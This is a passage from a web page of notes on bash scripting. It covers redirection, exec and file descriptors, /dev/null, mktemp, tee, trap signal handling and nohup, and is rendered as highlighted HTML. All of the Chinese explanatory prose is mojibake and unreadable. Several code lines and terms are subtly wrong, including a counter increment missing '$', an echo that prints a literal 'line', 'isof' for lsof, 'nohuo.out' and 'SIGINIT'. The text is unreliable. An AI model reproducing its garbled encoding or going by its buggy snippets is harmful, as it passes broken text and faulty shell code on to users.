é‡å®šå‘é”™è¯¯å’Œæ•°æ®"></a>2. é‡å®šå‘é”™è¯¯å’Œæ•°æ®</h4><p>éœ€è¦ç”¨ä¸¤ä¸ªé‡å®šå‘ç¬¦å·, ä¸”åœ¨ç¬¦å·å‰é¢æ”¾ä¸Šå¾…é‡å®šå‘æ•°æ®å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span> -al <span class="hljs-built_in">test</span> test2 test3 badfile 2&gt; test6 1&gt; test7</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨ <code>&amp;&gt;</code> è¿™ä¸ªç‰¹æ®Šçš„é‡å®šå‘ç¬¦å·, æŠŠ STDOUT å’Œ STDERR é‡å®šå‘åˆ°åŒä¸€ä¸ªæ–‡ä»¶.</p><p>ä¸ºäº†é¿å…é”™è¯¯ä¿¡æ¯æ•£è½åœ¨è¾“å‡ºæ–‡ä»¶ä¸­, ç›¸è¾ƒäºæ ‡å‡†è¾“å‡º, bash shell è‡ªåŠ¨èµ‹äºˆäº†é”™è¯¯æ¶ˆæ¯æ›´é«˜çš„ä¼˜å…ˆçº§.</p><h2 id="15-2-åœ¨è„šæœ¬ä¸­é‡å®šå‘è¾“å‡º"><a href="#15-2-åœ¨è„šæœ¬ä¸­é‡å®šå‘è¾“å‡º" class="headerlink" title="15.2 åœ¨è„šæœ¬ä¸­é‡å®šå‘è¾“å‡º"></a>15.2 åœ¨è„šæœ¬ä¸­é‡å®šå‘è¾“å‡º</h2><p>æœ‰ä¸¤ç§æ–¹æ³•åœ¨è„šæœ¬ä¸­é‡å®šå‘è¾“å‡º:</p><ul><li>ä¸´æ—¶é‡å®šå‘è¡Œè¾“å‡º</li><li>æ°¸ä¹…é‡å®šå‘è„šæœ¬ä¸­çš„æ‰€æœ‰è¾“å‡º</li></ul><h3 id="15-2-1-ä¸´æ—¶é‡å®šå‘"><a href="#15-2-1-ä¸´æ—¶é‡å®šå‘" class="headerlink" title="15.2.1 ä¸´æ—¶é‡å®šå‘"></a>15.2.1 ä¸´æ—¶é‡å®šå‘</h3><p>åœ¨é‡å®šå‘åˆ°æ–‡ä»¶æè¿°ç¬¦æ—¶, å¿…é¡»åœ¨æ–‡ä»¶æè¿°ç¬¦æ•°å­—ä¹‹å‰åŠ ä¸€ä¸ª <code>&amp;</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This is an error&quot;</span> &gt;&amp;2<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This is an normal output&quot;</span><br></code></pre></td></tr></table></figure><p>é»˜è®¤æƒ…å†µä¸‹, Linxu ä¼šå°† STDERR å¯¼å‘ STDOUT, å¦‚æœåœ¨è¿è¡Œè„šæœ¬æ—¶é‡å®šå‘äº† STDERR, è„šæœ¬ä¸­æ‰€æœ‰å¯¼å‘ STDERR çš„æ–‡æœ¬éƒ½ä¼šè¢«é‡å®šå‘.</p><h3 id="15-2-2-æ°¸ä¹…é‡å®šå‘"><a href="#15-2-2-æ°¸ä¹…é‡å®šå‘" class="headerlink" title="15.2.2 æ°¸ä¹…é‡å®šå‘"></a>15.2.2 æ°¸ä¹…é‡å®šå‘</h3><p>å¯ä»¥ç”¨ exec å‘½ä»¤å‘Šè¯‰ shell åœ¨æ‰§è¡Œè„šæœ¬æœŸé—´é‡å®šå‘æŸä¸ªç‰¹å®šçš„æ–‡ä»¶æè¿°ç¬¦:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span> <span class="hljs-number">1</span>&gt;testout<br></code></pre></td></tr></table></figure><p>exec å‘½ä»¤ä¼šå¯åŠ¨ä¸€ä¸ªæ–° shell å¹¶å°† STDOUT æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘åˆ°æ–‡ä»¶. è¿™é‡Œå®é™…ä¸ŠæŠŠ 1 è¿™ä¸ªæ–‡ä»¶æè¿°é‡æ–°åˆ†é…ç»™äº† testout è¿™ä¸ªæ–‡ä»¶.</p><p>exec åœ¨ man page ä¸­çš„æè¿°ä¸º: execute commands and open, close, or copy file descriptors.</p><h2 id="15-3-åœ¨è„šæœ¬ä¸­é‡å®šå‘è¾“å…¥"><a href="#15-3-åœ¨è„šæœ¬ä¸­é‡å®šå‘è¾“å…¥" class="headerlink" title="15.3 åœ¨è„šæœ¬ä¸­é‡å®šå‘è¾“å…¥"></a>15.3 åœ¨è„šæœ¬ä¸­é‡å®šå‘è¾“å…¥</h2><p>exec å‘½ä»¤å…è®¸ä½ å°† STDIN é‡å®šå‘åˆ° Linux ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ä¸­:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span> <span class="hljs-number">0</span>&lt; testfile<br></code></pre></td></tr></table></figure><p>å¦‚ :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><span class="hljs-built_in">exec</span> 0&lt; testfile<br>count=0<br><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line<br><span class="hljs-keyword">do</span> <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Line #<span class="hljs-variable">$count</span>: line&quot;</span><br>    count=$[ <span class="hljs-variable">$count</span> + 1 ]<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="15-4-åˆ›å»ºè‡ªå·±çš„é‡å®šå‘"><a href="#15-4-åˆ›å»ºè‡ªå·±çš„é‡å®šå‘" class="headerlink" title="15.4 åˆ›å»ºè‡ªå·±çš„é‡å®šå‘"></a>15.4 åˆ›å»ºè‡ªå·±çš„é‡å®šå‘</h2><h3 id="15-4-1-åˆ›å»ºè¾“å‡ºæ–‡ä»¶æè¿°ç¬¦"><a href="#15-4-1-åˆ›å»ºè¾“å‡ºæ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="15.4.1 åˆ›å»ºè¾“å‡ºæ–‡ä»¶æè¿°ç¬¦"></a>15.4.1 åˆ›å»ºè¾“å‡ºæ–‡ä»¶æè¿°ç¬¦</h3><p>å¯ä»¥ç”¨ exec å‘½ä»¤æ¥ç»™è¾“å‡ºåˆ†é…æ–‡ä»¶æè¿°ç¬¦.</p><p>ä¸€æ—¦å°†å¦ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦åˆ†é…ç»™ä¸€ä¸ªæ–‡ä»¶, è¿™ä¸ªé‡å®šå‘å°±ä¼šä¸€ç›´æœ‰æ•ˆ, ç›´åˆ°ä½ é‡æ–°åˆ†é….</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span> <span class="hljs-number">3</span>&gt;testout<br></code></pre></td></tr></table></figure><h3 id="15-4-2-é‡å®šå‘æ–‡ä»¶æè¿°ç¬¦"><a href="#15-4-2-é‡å®šå‘æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="15.4.2 é‡å®šå‘æ–‡ä»¶æè¿°ç¬¦"></a>15.4.2 é‡å®šå‘æ–‡ä»¶æè¿°ç¬¦</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span> <span class="hljs-number">3</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æŠŠæ–‡ä»¶æè¿°ç¬¦ 3 æŒ‡å‘æ–‡ä»¶æè¿°ç¬¦ 1.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span> <span class="hljs-number">1</span>&gt;&amp;<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>æ¢å¤.</p><h3 id="15-4-3-åˆ›å»ºè¾“å…¥æ–‡ä»¶æè¿°ç¬¦"><a href="#15-4-3-åˆ›å»ºè¾“å…¥æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="15.4.3 åˆ›å»ºè¾“å…¥æ–‡ä»¶æè¿°ç¬¦"></a>15.4.3 åˆ›å»ºè¾“å…¥æ–‡ä»¶æè¿°ç¬¦</h3><p>åœ¨é‡å®šå‘åˆ°æ–‡ä»¶ä¹‹å‰, å…ˆå°† STDIN æ–‡ä»¶æè¿°ç¬¦ä¿å­˜åˆ°å¦å¤–ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦, ç„¶ååœ¨è¯»å–å®Œæ–‡ä»¶ä¹‹åå†å°† STDIN æ¢å¤åˆ°å®ƒåŸæ¥çš„ä½ç½®:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><br><span class="hljs-built_in">exec</span> 6&lt;&amp;0<br><br><span class="hljs-built_in">exec</span> 0&lt; testfile<br><br>count=1<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line <br><span class="hljs-keyword">do</span> <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Line #<span class="hljs-variable">$count</span>: <span class="hljs-variable">$line</span>&quot;</span><br>    count=[ <span class="hljs-variable">$count</span> + 1 ]<br><span class="hljs-keyword">done</span><br><span class="hljs-built_in">exec</span> 0&lt;&amp;6<br></code></pre></td></tr></table></figure><h3 id="15-4-4-åˆ›å»ºè¯»å†™æ–‡ä»¶æè¿°ç¬¦"><a href="#15-4-4-åˆ›å»ºè¯»å†™æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="15.4.4 åˆ›å»ºè¯»å†™æ–‡ä»¶æè¿°ç¬¦"></a>15.4.4 åˆ›å»ºè¯»å†™æ–‡ä»¶æè¿°ç¬¦</h3><p>å¯ä»¥æ‰“å¼€å•ä¸ªæ–‡ä»¶æè¿°ç¬¦æ¥ä½œä¸ºè¾“å…¥å’Œè¾“å‡º.</p><p>ä»»ä½•è¯»æˆ–å†™éƒ½ä¼šä»æ–‡ä»¶æŒ‡é’ˆä¸Šæ¬¡çš„ä½ç½®å¼€å§‹, æ¯”å¦‚ä½ å…ˆç”¨è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦è¾“å‡ºäº†ä¸€è¡Œ, è¿™æ—¶è¿™ä¸ªæŒ‡é’ˆå°±æŒ‡å‘è¿™ä¸€è¡Œçš„æœ«å°¾äº†, å¦‚æœä½ è¿™ä¸ªæ—¶å€™è¾“å…¥ä¸€æ®µæ–‡æœ¬, è¿™ä¸ªæ–‡æœ¬å°±ä¼šæ’å…¥åˆ°è¿™ä¸ªæŒ‡é’ˆæ‰€æŒ‡çš„ä½ç½®, è€Œä¸æ˜¯æ–‡ä»¶çš„æœ«å°¾.</p><h3 id="15-4-5-å…³é—­æ–‡ä»¶æè¿°ç¬¦"><a href="#15-4-5-å…³é—­æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="15.4.5 å…³é—­æ–‡ä»¶æè¿°ç¬¦"></a>15.4.5 å…³é—­æ–‡ä»¶æè¿°ç¬¦</h3><p>å¦‚æœä½ åˆ›å»ºäº†æ–°çš„è¾“å…¥æˆ–è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦, shell ä¼šåœ¨è„šæœ¬é€€å‡ºæ—¶è‡ªåŠ¨å…³é—­å®ƒä»¬.</p><p>åœ¨è„šæœ¬ç»“æŸå‰æ‰‹åŠ¨å…³é—­æ–‡ä»¶æè¿°ç¬¦, éœ€è¦å°†å®ƒé‡å®šå‘åˆ°ç‰¹æ®Šç¬¦å· <code>&amp;-</code>:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">exec <span class="hljs-number">3</span>&gt;<span class="hljs-meta">&amp;-</span><br></code></pre></td></tr></table></figure><p>åœ¨å…³é—­æ–‡ä»¶æè¿°ç¬¦å, å¦‚æœä½ éšååœ¨è„šæœ¬ä¸­æ‰“å¼€äº†åŒä¸€ä¸ªæ–‡ä»¶, shell ä¼šç”¨ä¸€ä¸ªæ–°æ–‡ä»¶æ¥æ›¿æ¢å·²æœ‰çš„æ–‡ä»¶, æ„æ€å°±æ˜¯å…¶å†…å®¹ä¼šè¢«è¦†ç›–.</p><h2 id="15-5-åˆ—å‡ºæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦"><a href="#15-5-åˆ—å‡ºæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="15.5 åˆ—å‡ºæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦"></a>15.5 åˆ—å‡ºæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦</h2><p>ä½¿ç”¨ <code>isof</code> å‘½ä»¤åˆ—å‡º Linux ç³»ç»Ÿæ‰“å¼€çš„æ‰€æœ‰æ–‡ä»¶æè¿°ç¬¦.</p><h2 id="15-6-é˜»æ­¢å‘½ä»¤è¾“å‡º"><a href="#15-6-é˜»æ­¢å‘½ä»¤è¾“å‡º" class="headerlink" title="15.6 é˜»æ­¢å‘½ä»¤è¾“å‡º"></a>15.6 é˜»æ­¢å‘½ä»¤è¾“å‡º</h2><p>å¯ä»¥å°† STDERR çš„è¾“å‡ºä»å®šå‘åˆ°å« null æ–‡ä»¶çš„ç‰¹æ®Šæ–‡ä»¶.</p><p>shell è¾“å‡ºåˆ° null æ–‡ä»¶çš„ä»»ä½•æ•°æ®éƒ½ä¸ä¼šä¿å­˜, å…¨éƒ¨éƒ½ä¼šè¢«ä¸¢å¼ƒ.</p><p>åœ¨ Linux ç³»ç»Ÿä¸Š null æ–‡ä»¶çš„æ ‡å‡†ä½ç½®æ˜¯ &#x2F;dev&#x2F;null.</p><p>ä¹Ÿå¯ä»¥ç”¨ &#x2F;dev&#x2F;null ä½œä¸ºè¾“å…¥æ–‡ä»¶, å…¶èƒ½å¤Ÿå¿«é€Ÿæ¸…é™¤ç°æœ‰æ–‡ä»¶ä¸­çš„æ•°æ®.</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ cat <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> &gt; testfile<br></code></pre></td></tr></table></figure><h2 id="15-7-åˆ›å»ºä¸´æ—¶æ–‡ä»¶"><a href="#15-7-åˆ›å»ºä¸´æ—¶æ–‡ä»¶" class="headerlink" title="15.7 åˆ›å»ºä¸´æ—¶æ–‡ä»¶"></a>15.7 åˆ›å»ºä¸´æ—¶æ–‡ä»¶</h2><p>Linux ä½¿ç”¨ &#x2F;tmp ç›®å½•æ¥å­˜æ”¾ä¸éœ€è¦ç”¨å°±ä¿å­˜çš„æ–‡ä»¶, å¤§å¤šæ•° Linux å‘è¡Œç‰ˆé…ç½®äº†ç³»ç»Ÿåœ¨å¯åŠ¨æ—¶è‡ªåŠ¨åˆ é™¤ &#x2F;tmp ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶.</p><p><code>mktemp</code> å‘½ä»¤å¯ä»¥åœ¨ <code>/tmp</code> ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„ä¸´æ—¶æ–‡ä»¶, shell ä¼šåˆ›å»ºè¿™ä¸ªæ–‡ä»¶, ä½†ä¸ç”¨é»˜è®¤çš„ umask å€¼. å®ƒä¼šå°†æ–‡ä»¶çš„è¯»å’Œå†™æƒé™åˆ†é…ç»™æ–‡ä»¶çš„å±ä¸», å¹¶å°†ä½ è®¾æˆæ–‡ä»¶çš„å±ä¸».</p><h3 id="15-7-1-åˆ›å»ºæœ¬åœ°ä¸´æ—¶æ–‡ä»¶"><a href="#15-7-1-åˆ›å»ºæœ¬åœ°ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="15.7.1 åˆ›å»ºæœ¬åœ°ä¸´æ—¶æ–‡ä»¶"></a>15.7.1 åˆ›å»ºæœ¬åœ°ä¸´æ—¶æ–‡ä»¶</h3><p>è¦ç”¨ mktemp å‘½ä»¤åœ¨æœ¬åœ°ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªå”¯ä¸€æ–‡ä»¶, éœ€è¦æŒ‡å®šä¸€ä¸ªæ–‡ä»¶åæ¨¡æ¿, æ¨¡æ¿å¯ä»¥åŒ…å«ä»»æ„æ–‡æœ¬æ–‡ä»¶å, åœ¨æ–‡ä»¶åæœ«å°¾åŠ ä¸Š 6 ä¸ª X å°±è¡Œäº†, mktemp å‘½ä»¤ä¼šç”¨ 6 ä¸ªå­—ç¬¦ç æ›¿æ¢è¿™ 6 ä¸ª X, ä»è€Œä¿è¯æ–‡ä»¶ååœ¨ç›®å½•ä¸­å”¯ä¸€.</p><p>å°†æ–‡ä»¶åä¿å­˜åœ¨å˜é‡ä¸­:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">tempfile=<span class="hljs-constructor">$(<span class="hljs-params">mktemp</span> <span class="hljs-params">test</span>.XXXXXX)</span><br></code></pre></td></tr></table></figure><h3 id="15-7-2-åœ¨-x2F-tmp-ç›®å½•åˆ›å»ºä¸´æ—¶æ–‡ä»¶"><a href="#15-7-2-åœ¨-x2F-tmp-ç›®å½•åˆ›å»ºä¸´æ—¶æ–‡ä»¶" class="headerlink" title="15.7.2 åœ¨ &#x2F;tmp ç›®å½•åˆ›å»ºä¸´æ—¶æ–‡ä»¶"></a>15.7.2 åœ¨ &#x2F;tmp ç›®å½•åˆ›å»ºä¸´æ—¶æ–‡ä»¶</h3><p>ä½¿ç”¨ <code>-t</code> é€‰é¡¹, å…¶ä¼šå¼ºåˆ¶ mktemp å‘½ä»¤æ¥åˆ°ç³»ç»Ÿçš„ä¸´æ—¶ç›®å½•æ¥åˆ›å»ºè¯¥æ–‡ä»¶, åœ¨ä½¿ç”¨è¿™ä¸ªç‰¹æ€§æ—¶, mktemp å‘½ä»¤ä¼šè¿”å›ç”¨æ¥åˆ›å»ºä¸´æ—¶æ–‡ä»¶æ—¶çš„å…¨è·¯å¾„.</p><h3 id="15-7-3-åˆ›å»ºä¸´æ—¶ç›®å½•"><a href="#15-7-3-åˆ›å»ºä¸´æ—¶ç›®å½•" class="headerlink" title="15.7.3 åˆ›å»ºä¸´æ—¶ç›®å½•"></a>15.7.3 åˆ›å»ºä¸´æ—¶ç›®å½•</h3><p><code>-d</code> é€‰é¡¹å‘Šè¯‰ mktemp åˆ›å»ºä¸€ä¸ªä¸´æ—¶ç›®å½•.</p><h2 id="15-8-è®°å½•æ¶ˆæ¯"><a href="#15-8-è®°å½•æ¶ˆæ¯" class="headerlink" title="15.8 è®°å½•æ¶ˆæ¯"></a>15.8 è®°å½•æ¶ˆæ¯</h2><p>ä½¿ç”¨ç‰¹æ®Šçš„ tee å‘½ä»¤, å¯ä»¥å°†è¾“å‡ºåŒæ—¶å‘é€åˆ°æ˜¾ç¤ºå™¨å’Œæ—¥å¿—æ–‡ä»¶.</p><p>å®ƒä¼šå°†ä» STDIN è¿‡æ¥çš„æ•°æ®åŒæ—¶å‘é€åˆ°ä¸¤å¤„, ä¸€å¤„æ˜¯ STDOUT, ä¸€å¤„æ˜¯ tee å‘½ä»¤è¡Œæ‰€æŒ‡å®šçš„æ–‡ä»¶:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">tee</span> filename<br></code></pre></td></tr></table></figure><p>å¯ä»¥é…åˆç®¡é“ç¬¦ <code>|</code>.</p><p>å¦‚æœæƒ³å°†æ•°æ®è¿½åŠ åˆ°æ–‡ä»¶, å¿…é¡»ä½¿ç”¨ <code>-a</code> é€‰é¡¹.</p><h1 id="ç¬¬16ç« -æ§åˆ¶è„šæœ¬"><a href="#ç¬¬16ç« -æ§åˆ¶è„šæœ¬" class="headerlink" title="ç¬¬16ç«  æ§åˆ¶è„šæœ¬"></a>ç¬¬16ç«  æ§åˆ¶è„šæœ¬</h1><h2 id="16-1-å¤„ç†ä¿¡å·"><a href="#16-1-å¤„ç†ä¿¡å·" class="headerlink" title="16.1 å¤„ç†ä¿¡å·"></a>16.1 å¤„ç†ä¿¡å·</h2><h3 id="16-1-1-é‡æ¸©-Linux-ä¿¡å·"><a href="#16-1-1-é‡æ¸©-Linux-ä¿¡å·" class="headerlink" title="16.1.1 é‡æ¸© Linux ä¿¡å·"></a>16.1.1 é‡æ¸© Linux ä¿¡å·</h3><p>é»˜è®¤æƒ…å†µä¸‹, bash shell ä¼šå¿½ç•¥æ”¶åˆ°çš„ä»»ä½• SIGQUIT (3) å’Œ SIGTERM (15) ä¿¡å·.</p><h3 id="16-1-2-ç”Ÿæˆä¿¡å·"><a href="#16-1-2-ç”Ÿæˆä¿¡å·" class="headerlink" title="16.1.2 ç”Ÿæˆä¿¡å·"></a>16.1.2 ç”Ÿæˆä¿¡å·</h3><h3 id="16-1-3-æ•è·ä¿¡å·"><a href="#16-1-3-æ•è·ä¿¡å·" class="headerlink" title="16.1.3 æ•è·ä¿¡å·"></a>16.1.3 æ•è·ä¿¡å·</h3><p>trap å‘½ä»¤å…è®¸ä½ æ¥æŒ‡å®š shell åŠè„šæœ¬è¦ç›‘çœ‹å¹¶ä» shell ä¸­æ‹¦æˆªçš„ Linux ä¿¡å·.</p><p>æ ¼å¼:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">trap</span> commands signals<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ trap å‘½ä»¤æ¥å¿½ç•¥ä¿¡å·å¦‚:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><br><span class="hljs-built_in">trap</span> <span class="hljs-string">&quot;echo &#x27;Sorry! I have trapped Ctrl+C&#x27;&quot;</span> SIGINT<br></code></pre></td></tr></table></figure><p>trap å‘½ä»¤ä¼šåœ¨æ¯æ¬¡æ£€æµ‹åˆ° SIGINIT ä¿¡å·æ—¶æ˜¾ç¤ºä¸€è¡Œæ–‡æœ¬, å¹¶æ•è·è¿™ä¸ªä¿¡å·, å…¶ä¼šé˜»æ­¢ç”¨æˆ·ç”¨ bash shell çš„ç»„åˆé”® Ctrl+C æ¥åœæ­¢ç¨‹åº. </p><h3 id="16-1-4-æ•è·è„šæœ¬é€€å‡º"><a href="#16-1-4-æ•è·è„šæœ¬é€€å‡º" class="headerlink" title="16.1.4 æ•è·è„šæœ¬é€€å‡º"></a>16.1.4 æ•è·è„šæœ¬é€€å‡º</h3><p>è¦æ•è·è„šæœ¬çš„é€€å‡º (ä¹Ÿå°±æ˜¯è„šæœ¬é€€å‡ºè¿™ä¸ªè¡Œä¸º), åœ¨ trap å‘½ä»¤ååŠ ä¸Š EXIT ä¿¡å·:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><br><span class="hljs-built_in">trap</span>  <span class="hljs-string">&quot;echo Goodbye...&quot;</span> EXIT<br></code></pre></td></tr></table></figure><p>åœ¨è„šæœ¬é€€å‡ºæ—¶, ä¼šæ‰“å° <code>Goodbye...</code></p><h3 id="16-1-5-ä¿®æ”¹æˆ–ç§»é™¤æ•è·"><a href="#16-1-5-ä¿®æ”¹æˆ–ç§»é™¤æ•è·" class="headerlink" title="16.1.5 ä¿®æ”¹æˆ–ç§»é™¤æ•è·"></a>16.1.5 ä¿®æ”¹æˆ–ç§»é™¤æ•è·</h3><p>åœ¨è„šæœ¬çš„ä¸åŒåœ°æ–¹è¿›è¡Œæ•è·, å°±è¿˜æ˜¯ç”¨ trap å‘½ä»¤, åªæ˜¯åé¢çš„é€‰é¡¹æ˜¯æ–°çš„, è¿™æ—¶è„šæœ¬è¦æ•è·çš„ä¿¡å·å°±è¢«ä¿®æ”¹äº†.</p><p>å¯ä»¥åˆ é™¤å·²è®¾ç½®å¥½çš„æ•è·, åœ¨ trap å‘½ä»¤ä¸å¸Œæœ›æ¢å¤é»˜è®¤è¡Œä¸ºçš„ä¿¡å·åˆ—è¡¨ä¹‹é—´åŠ ä¸Šä¸¤ä¸ªç ´æŠ˜å· (å•ä¸ªä¹Ÿè¡Œ).</p><p>å¦‚è¦æ¢å¤, å³ä¸å†å¯¹ SIGINT è¿›è¡Œæ•è·:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">trap <span class="hljs-comment">-- SIGINT</span><br></code></pre></td></tr></table></figure><h2 id="16-2-ä»¥åå°æ¨¡å¼è¿è¡Œè„šæœ¬"><a href="#16-2-ä»¥åå°æ¨¡å¼è¿è¡Œè„šæœ¬" class="headerlink" title="16.2 ä»¥åå°æ¨¡å¼è¿è¡Œè„šæœ¬"></a>16.2 ä»¥åå°æ¨¡å¼è¿è¡Œè„šæœ¬</h2><h3 id="16-2-1-åå°è¿è¡Œè„šæœ¬"><a href="#16-2-1-åå°è¿è¡Œè„šæœ¬" class="headerlink" title="16.2.1 åå°è¿è¡Œè„šæœ¬"></a>16.2.1 åå°è¿è¡Œè„šæœ¬</h3><p>åœ¨å‘½ä»¤ä¹‹ååŠ ä¸Š <code>&amp;</code> ç¬¦å·.</p><p>å½“åå°è¿›ç¨‹è¿è¡Œæ—¶, å®ƒä»ç„¶ä¼šä½¿ç”¨ç»ˆç«¯æ˜¾ç¤ºå™¨æ¥æ˜¾ç¤º STDOUT å’Œ STDERR æ¶ˆæ¯.</p><p>æœ€å¥½æ˜¯å°†åå°è¿è¡Œçš„è„šæœ¬çš„ STDOUT å’Œ STDERR é‡å®šå‘.</p><h2 id="16-3-åœ¨éæ§åˆ¶å°ä¸‹è¿è¡Œè„šæœ¬"><a href="#16-3-åœ¨éæ§åˆ¶å°ä¸‹è¿è¡Œè„šæœ¬" class="headerlink" title="16.3 åœ¨éæ§åˆ¶å°ä¸‹è¿è¡Œè„šæœ¬"></a>16.3 åœ¨éæ§åˆ¶å°ä¸‹è¿è¡Œè„šæœ¬</h2><p>nohup å‘½ä»¤è¿è¡Œäº†å¦å¤–ä¸€ä¸ªå‘½ä»¤æ¥é˜»æ–­æ‰€æœ‰å‘é€ç»™è¯¥è¿›ç¨‹çš„ SIGHUP ä¿¡å·, è¿™ä¼šåœ¨é€€å‡ºç»ˆç«¯ä¼šè¯æ—¶é˜»æ­¢è¿›ç¨‹é€€å‡º.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">nohup</span> ./test.sh &amp;</span><br></code></pre></td></tr></table></figure><p>ç”±äº nohup å‘½ä»¤ä¼šè§£é™¤ç»ˆç«¯ä¸è¿›ç¨‹çš„å…³è”, è¿›ç¨‹ä¹Ÿå°±ä¸å†åŒ STDOUT å’Œ STDERR è”ç³»åœ¨ä¸€èµ·, ä¸ºäº†ä¿å­˜è¯¥å‘½ä»¤äº§ç”Ÿçš„è¾“å‡º, nohup å‘½ä»¤ä¼šè‡ªåŠ¨å°† STDOUT å’Œ STDERR çš„æ¶ˆæ¯é‡å®šå‘åˆ°ä¸€ä¸ªåä¸º nohuo.out æ–‡ä»¶ä¸­.</p><h2 id="16-4-ä½œä¸šæ§åˆ¶"><a href="#16-4-ä½œä¸šæ§åˆ¶" class="headerlink" title="16.4 ä½œä¸šæ§åˆ¶"></a>16.4 ä½œä¸šæ§åˆ¶</h2><p>è„šæœ¬ç”¨ $$ å˜é‡æ¥æ˜¾ç¤º Linux ç³»ç»Ÿåˆ†é…ç»™è¯¥è„šæœ¬çš„ PID.</p><h2 id="16-6-å®šæ—¶æ§åˆ¶è„šæœ¬"><a href="#16-6-å®šæ—¶æ§åˆ¶è„šæœ¬" class="headerlink" title="16.6 å®šæ—¶æ§åˆ¶è„šæœ¬"></a>16.6 å®šæ—¶æ§åˆ¶è„šæœ¬</h2><p>åœ¨ç™»å½•æ—¶è¿è¡Œçš„è„šæœ¬åº”è¯¥æ”¾å…¥ <code>$HOME/.bash_profile</code>.</p><p>æ¯æ¬¡å¯åŠ¨ä¸€ä¸ªæ–°çš„ shell, bash shell éƒ½ä¼šè¿è¡Œ <code>.bashrc</code> æ–‡ä»¶.</p><p><code>.bashrc</code> 